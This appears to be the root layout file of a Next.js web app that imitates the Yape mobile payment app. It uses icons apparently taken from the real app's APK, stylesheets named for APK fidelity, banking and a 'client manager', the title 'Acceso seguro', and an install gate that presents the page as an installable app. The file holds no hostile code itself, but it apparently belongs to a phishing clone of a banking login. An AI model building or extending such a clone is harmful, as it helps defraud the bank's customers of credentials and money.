import type { Metadata, Viewport } from "next";
import { AppInstallGate } from "./components/AppInstallGate";
import { MobileViewportSync } from "./components/MobileViewportSync";
import "./globals.css";
import "./bank.css";
import "./apk-fidelity.css";
import "./install.css";
import "./client-manager.css";
import "./mobile-viewport.css";

const appIcon = "/assets/apk/icons/ic_yape_logo_r_yape_primary_700.svg";
const androidIcon = "/icons/yape-192.png";

export const metadata: Metadata = {
  applicationName: "Yape",
  title: {
    default: "Acceso seguro",
    template: "%s | Acceso seguro",
  },
  description: "Acceso a la aplicación de banca móvil.",
  manifest: "/manifest.webmanifest",
  appleWebApp: {
    capable: true,
    statusBarStyle: "black-translucent",
    title: "Yape",
  },
  formatDetection: {
    telephone: false,
  },
  icons: {
    icon: [
      { url: androidIcon, type: "image/png", sizes: "192x192" },
      { url: appIcon, type: "image/svg+xml" },
    ],
    apple: [{ url: androidIcon, type: "image/png", sizes: "192x192" }],
  },
  other: {
    "mobile-web-app-capable": "yes",
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  viewportFit: "cover",
  themeColor: "#742284",
  interactiveWidget: "resizes-content",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="es">
      <body suppressHydrationWarning>
        <MobileViewportSync />
        <AppInstallGate>{children}</AppInstallGate>
      </body>
    </html>
  );
}
